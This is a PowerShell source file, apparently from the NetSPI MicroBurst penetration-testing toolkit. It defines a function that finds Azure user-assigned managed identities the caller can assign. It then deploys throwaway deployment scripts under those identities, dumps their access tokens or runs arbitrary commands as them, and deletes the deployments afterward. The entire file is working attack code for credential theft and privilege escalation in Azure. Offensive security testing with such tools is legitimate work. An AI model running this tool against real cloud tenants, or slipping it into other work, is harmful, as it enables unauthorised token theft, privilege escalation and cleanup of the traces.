<#
    File: Invoke-AzUADeploymentScript.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2024
    Description: PowerShell function for generating Azure User-Assigned Managed Identity tokens, using deployment scripts.
#>

Function Invoke-AzUADeploymentScript
{

<#
    .SYNOPSIS
        Enumerates and dumps access tokens for any available User-Assigned Managed Identities.
    .DESCRIPTION
        This function will look for any available User-Assigned Managed Identities, then allows you to run commands (via Deployment Scripts) as that identity. The base usage will create a temporary Deployment Script that attaches the selected Managed Identity and generates a management scoped access token.
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER TokenScope
        The scope to generate the Managed Identity for.
    .PARAMETER Command
        The Command to run as the Managed Identity in the Deployment Script environment. If you are expecting output from this command, make sure that you pipe your command to a ConvertTo-* in the parameter to ensure that a string is returned to the output function. Example: -Command "Get-AzResource | ConvertTo-Json"
    .EXAMPLE
        PS C:\MicroBurst> Invoke-AzUADeploymentScript -Verbose
        VERBOSE: Logged In as kfosaaen@example.com
        VERBOSE: Enumerating User Assigned Managed Identities in the "Sample Subscription" Subscription
        VERBOSE: 	4 total User Assigned Managed Identities identified in the "Sample Subscription" Subscription
        VERBOSE: 		Checking permissions on NetSPI Managed Identity
        VERBOSE: 		Checking permissions on testIdentity Managed Identity
        VERBOSE: 		Checking permissions on secondID Managed Identity
        VERBOSE: 		Checking permissions on ID3 Managed Identity
        VERBOSE: 	10 User Assigned Managed Identity Role Assignments that the current user has access to
        VERBOSE: 	Targeting the ID3 Managed Identity using the MDFTjQIEZckgyNf Deployment Script
        VERBOSE: 		Starting the deployment (tmp8B1) of the MDFTjQIEZckgyNf Deployment Script to the tester Resource Group
        VERBOSE: 		Deleting the MDFTjQIEZckgyNf Deployment Script
        VERBOSE: 		Deleting the tmp8B1 Deployment
        VERBOSE: 	Completed targeting the ID3 Managed Identity
        VERBOSE: Completed attacks against the "Sample Subscription" Subscription
    
    .LINK
        https://github.com/NetSPI/MicroBurst
        https://github.com/SecureHats/miaow
        https://rogierdijkman.medium.com/project-miaow-9f334e8ec09e
#>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",

        [parameter(Mandatory=$false,
        HelpMessage="The scope to generate the Managed Identity for.")]
        [String]$TokenScope = "https://management.azure.com/",

        [parameter(Mandatory=$false,
        HelpMessage="The Resource Group to deploy the Deployment Script to.")]
        [String]$ResourceGroup = "",

        [parameter(Mandatory=$false,
        HelpMessage="The Subscription that contains the Resource Group to deploy the Deployment Script to.")]
        [String]$DeploymentSubscriptionID = "",

        [Parameter(Mandatory=$false,
        HelpMessage="Command to run in the deployment script.")]
        [string]$Command = "(Get-AzAccessToken -ResourceUrl $TokenScope).Token"
    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
   
    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Invoke-AzUADeploymentScript -Subscription $sub -TokenScope $TokenScope -Command $Command -ResourceGroup $ResourceGroup -DeploymentSubscriptionID $DeploymentSubscriptionID}
        return
    }

    Write-Verbose "Logged In as $accountName"
    Write-Verbose "Enumerating User Assigned Managed Identities in the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"

    # Create data table to house roles
    $TempTblRoles = New-Object System.Data.DataTable 
    $TempTblRoles.Columns.Add("DisplayName") | Out-Null
    $TempTblRoles.Columns.Add("RoleDefinitionName") | Out-Null
    $TempTblRoles.Columns.Add("Scope") | Out-Null
    $TempTblRoles.Columns.Add("ResourceGroup") | Out-Null
    $TempTblRoles.Columns.Add("SubscriptionID") | Out-Null

    # Create data table to house output
    $TempTblOutput = New-Object System.Data.DataTable 
    $TempTblOutput.Columns.Add("ManagedIdentity") | Out-Null
    $TempTblOutput.Columns.Add("Output") | Out-Null

    # Get the list of UA-MIs and Role Assignments
    $uamiList = Get-AzUserAssignedIdentity
    Write-Verbose "`t$($uamiList.Count) total User Assigned Managed Identities identified in the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"
    $uamiList | ForEach-Object {
        $IDRG = $_.ResourceGroupName
        $uamidID = $_.PrincipalId
        $uamidName = $_.Name
        $uamidSub = $_.Id.Split('/')[2]
        $AccessToken = Get-AzAccessToken
        if ($AccessToken.Token -is [System.Security.SecureString]) {
            $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
            try {
                $Token = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
            } finally {
                [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
            }
        } else {
            $Token = $AccessToken.Token
        }

        Write-Verbose "`t`tChecking permissions on $($_.Name) Managed Identity"

        # Authorization Check - * or "Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action" permissions on the UAMI
        $url = "https://management.azure.com/$($_.Id)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
        $uamiAccess = $false
        (Invoke-RestMethod -Verbose:$false -Uri $url -Headers @{ Authorization ="Bearer $token"}).value | ForEach-Object{
            if($_.actions -eq "*"){
                $uamiAccess = $true
            }
            elseif($_.actions -eq "Microsoft.ManagedIdentity/userAssignedIdentities/*/assign/action"){
                $uamiAccess = $true
            }
        }

        # If you have read/assign, then proceed
        if($uamiAccess -eq $true){
            # Get roles from all available subscriptions and management groups
            $tempRoles = Get-AzRoleAssignment -ObjectId $_.PrincipalId -ErrorAction SilentlyContinue
            $tempRoles | ForEach-Object{
                $TempTblRoles.Rows.Add($uamidName,$_.RoleDefinitionName,$_.Scope,$IDRG,$uamidSub) | Out-Null
            }

            # Get roles from all available subscriptions
            $subscriptionList = Get-AzSubscription -WarningAction SilentlyContinue
            $subscriptionList | ForEach-Object{
                $tempRoles = Get-AzRoleAssignment -ObjectId $uamidID -Scope $(-join('/subscriptions/',$_.id)) -ErrorAction SilentlyContinue
                $tempRoles | ForEach-Object{
                    $TempTblRoles.Rows.Add($uamidName,$_.RoleDefinitionName,$_.Scope,$IDRG,$uamidSub) | Out-Null
                }
            }

            # Get roles from all available management groups
            $mgmtGroups = Get-AzManagementGroup        
            $mgmtGroups | ForEach-Object{
                $tempRoles = Get-AzRoleAssignment -ObjectId $uamidID -Scope $_.Id -ErrorAction SilentlyContinue
                $tempRoles | ForEach-Object{
                    $TempTblRoles.Rows.Add($uamidName,$_.RoleDefinitionName,$_.Scope,$IDRG,$uamidSub) | Out-Null
                }
            }
        }
    }

    $TempTblRolesSorted = $TempTblRoles | Sort-Object -Property DisplayName,RoleDefinitionName,Scope,ResourceGroup,SubscriptionID -Unique | Select-Object DisplayName,RoleDefinitionName,Scope,ResourceGroup,SubscriptionID

    Write-Verbose "`t$($TempTblRolesSorted.Rows.Count) User Assigned Managed Identity Role Assignments that the current user has access to"
    

    # Select a UA-MI to use
    $roleChoice =  $TempTblRolesSorted | Out-GridView -Title "Select One or More Identities/Roles to run commands as" -PassThru

    foreach($role in $roleChoice){

        $scriptName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})

        Write-Verbose "`tTargeting the $($role.DisplayName) Managed Identity using the $scriptName Deployment Script"
            
        # Create the deployment template with the command embedded
        $tempDeployment = "{
        `"`$schema`": `"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#`",
        `"contentVersion`": `"1.0.0.0`",
        `"parameters`": {
            `"utcValue`": {
                `"type`": `"String`",
			    `"defaultValue`":`"[utcNow()]`"
            },
            `"managedIdentitySubscription`": {
                `"type`": `"String`"
            },
            `"managedIdentityResourceGroup`": {
                `"type`": `"String`"
            },
            `"managedIdentityName`": {
                `"type`": `"String`"
            },
            `"command`": {
                `"type`": `"String`",
			    `"defaultValue`":`"(Get-AzAccessToken).Token`"
            }		
        },
        `"variables`": {},
        `"resources`": [
            {
                `"type`": `"Microsoft.Resources/deploymentScripts`",
                `"apiVersion`": `"2020-10-01`",
                `"name`": `"$scriptName`",
                `"location`": `"[resourceGroup().location]`",
                `"kind`": `"AzurePowerShell`",
                `"identity`": {
                    `"type`": `"UserAssigned`",
                    `"userAssignedIdentities`": {
                        `"[resourceId(parameters('managedIdentitySubscription'), parameters('managedIdentityResourceGroup'), 'Microsoft.ManagedIdentity/userAssignedIdentities', parameters('managedIdentityName'))]`": {}
                    }
                },
                `"properties`": {
                    `"forceUpdateTag`": `"[parameters('utcValue')]`",
                    `"azPowerShellVersion`": `"8.3`",
                    `"timeout`": `"PT30M`",
                    `"arguments`": `"`",
                    `"scriptContent`": `"`$output = $command; `$DeploymentScriptOutputs = @{}; `$DeploymentScriptOutputs['text'] = `$output`",
                    `"cleanupPreference`": `"Always`",
                    `"retentionInterval`": `"P1D`"
                }
            }
        ],
        `"outputs`": {
            `"result`": {
                `"value`": `"[reference('$scriptName').outputs.text]`",
            `"type`": `"string`"
            }
          }
        }"

        # Create Temp File
        $TemplateFile = New-TemporaryFile
        $tempDeployment | Out-File $TemplateFile

        # Improvement Opportunity - !!! Test Resource Group Permissions before attempting to deploy

        # If alternate Subscription is in use, swap Subscriptions
        if(($DeploymentSubscriptionID -ne "") -and ($ResourceGroup -ne "")){
            $currentContext = Get-AzContext
            Set-AzContext -SubscriptionId $DeploymentSubscriptionID | Out-Null

            try{Get-AzResourceGroup -Name $ResourceGroup -ErrorAction Stop | Out-Null}
            catch{Write-Verbose "$ResourceGroup is an invalid Resource Group Name for the `"$((Get-AzSubscription -SubscriptionId $DeploymentSubscriptionID).Name)`" subscription"; Write-Host "$ResourceGroup is an invalid Resource Group Name for the `"$((Get-AzSubscription -SubscriptionId $DeploymentSubscriptionID).Name)`" subscription"; break}

            # Deploy the Template
            Write-Verbose "`t`tStarting the deployment ($($TemplateFile.BaseName)) of the $scriptName Deployment Script to the $ResourceGroup Resource Group"
            $newDeployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -managedIdentitySubscription $role.SubscriptionID -managedIdentityName $role.DisplayName -managedIdentityResourceGroup $role.ResourceGroup -Verbose:$false

            # Delete the deployment script
            Write-Verbose "`t`tDeleting the $scriptName Deployment Script"
            Remove-AzDeploymentScript -Name $scriptName -ResourceGroupName $ResourceGroup

            # Delete the deployment
            Write-Verbose "`t`tDeleting the $($TemplateFile.BaseName) Deployment"
            Remove-AzResourceGroupDeployment -Name $($TemplateFile.BaseName) -ResourceGroupName $ResourceGroup -Verbose:$false| Out-Null

            Set-AzContext -Context $currentContext | Out-Null
        }
        elseif($ResourceGroup -ne ""){

            # If Resource Group is specified, use that resource in your current subscription
            try{Get-AzResourceGroup -Name $ResourceGroup -ErrorAction Stop | Out-Null}
            catch{Write-Verbose "$ResourceGroup is an invalid Resource Group Name for the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" subscription"; Write-Host "$ResourceGroup is an invalid Resource Group Name for the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" subscription"; break}

            # Deploy the Template
            Write-Verbose "`t`tStarting the deployment ($($TemplateFile.BaseName)) of the $scriptName Deployment Script to the $ResourceGroup Resource Group"
            $newDeployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -managedIdentitySubscription $role.SubscriptionID  -managedIdentityName $role.DisplayName -managedIdentityResourceGroup $role.ResourceGroup -Verbose:$false        

            # Delete the deployment script
            Write-Verbose "`t`tDeleting the $scriptName Deployment Script"
            Remove-AzDeploymentScript -Name $scriptName -ResourceGroupName $ResourceGroup

            # Delete the deployment
            Write-Verbose "`t`tDeleting the $($TemplateFile.BaseName) Deployment"
            Remove-AzResourceGroupDeployment -Name $($TemplateFile.BaseName) -ResourceGroupName $ResourceGroup -Verbose:$false| Out-Null
        }
        else{
            
            # If running defaults, just deploy to the Resource Group of the UA-MI

            $ResourceGroup = $role.ResourceGroup
            
            # Deploy the Template
            Write-Verbose "`t`tStarting the deployment ($($TemplateFile.BaseName)) of the $scriptName Deployment Script to the $ResourceGroup Resource Group"
            $newDeployment = New-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -TemplateFile $TemplateFile -managedIdentitySubscription $role.SubscriptionID -managedIdentityName $role.DisplayName -managedIdentityResourceGroup $role.ResourceGroup -Verbose:$false

            # Delete the deployment script
            Write-Verbose "`t`tDeleting the $scriptName Deployment Script"
            Remove-AzDeploymentScript -Name $scriptName -ResourceGroupName $ResourceGroup

            # Delete the deployment
            Write-Verbose "`t`tDeleting the $($TemplateFile.BaseName) Deployment"
            Remove-AzResourceGroupDeployment -Name $($TemplateFile.BaseName) -ResourceGroupName $ResourceGroup -Verbose:$false| Out-Null
        }
        
        # Add the Output to the table
        $TempTblOutput.Rows.Add($role.DisplayName,$newDeployment.Outputs.Values.value) | Out-Null

        # Delete Temp File
        Remove-Item $TemplateFile
        
        Write-Verbose "`tCompleted targeting the $($role.DisplayName) Managed Identity"
    }

    Write-Verbose "Completed attacks against the `"$((Get-AzSubscription -SubscriptionId $Subscription).Name)`" Subscription"

    Write-Output $TempTblOutput
}